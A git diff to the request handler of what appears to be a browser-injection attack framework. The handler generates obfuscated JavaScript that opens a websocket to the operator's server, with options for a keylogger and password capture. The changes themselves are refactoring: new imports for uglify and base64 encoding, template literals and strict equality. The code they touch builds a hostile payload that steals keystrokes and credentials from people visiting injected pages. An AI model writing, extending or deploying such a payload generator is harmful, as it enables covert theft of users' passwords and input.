@@ -1,6 +1,9 @@
 const chalk = require('chalk')
 const ObfuscateJS = require('js-obfuscator')
 const beautify = require('js-beautify').js_beautify
+const UglifyJS = require('uglify-es')
+const btoa = require('btoa')
+const config = require('../../server.config.js')
 
 module.exports = (req, res) => {
   function enc (string, enableEval) {
@@ -120,8 +123,8 @@ module.exports = (req, res) => {
     let injectScript
 
     if (inject) {
-      let websocket = "'"+ wss + "'+p+'i/websocket?" + injectProject + "'"
-      if (req.query.passwords === 'false' && keylogger === false) websocket = "'" + wss + proxy + "i/websocket?" + injectProject + "'"
+      let websocket = `'${wss}'+p+'i/websocket?${injectProject}'`
+      if (req.query.passwords === 'false' && keylogger === false) websocket = `'${wss}${proxy}i/websocket?${injectProject}'`
       body += `
         function u() {` + comment('Open a new websocket to the server') + `
           window.ws = new WebSocket(` + websocket + `)
@@ -204,7 +207,7 @@ module.exports = (req, res) => {
 
 
     ` + injectScript
-    if (!(req.query.passwords == 'false' && keylogger == false)) {
+    if (!(req.query.passwords === 'false' && keylogger === false)) {
       script = help + `
       //  Project name    | ` + req.query.project + `
 
